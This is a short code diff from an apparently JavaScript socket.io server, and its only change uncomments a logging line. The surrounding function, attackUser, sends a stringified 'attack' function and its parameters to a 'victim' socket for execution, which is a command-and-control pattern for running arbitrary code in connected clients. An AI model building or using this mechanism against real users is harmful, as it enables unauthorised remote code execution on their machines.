@@ -62,7 +62,7 @@ function disconnect() {
 }
 
 function attackUser(data) {
-  // console.log("received instructions to use attack " + data.attack + " on " + data.userSocket)
+  console.log("received instructions to use attack " + data.attack + " on " + data.userSocket)
   server.ioVictim.to(data.userSocket).emit('execute', {
     func: `var attack = ${data.attack.toString()}`,
     params: data.params
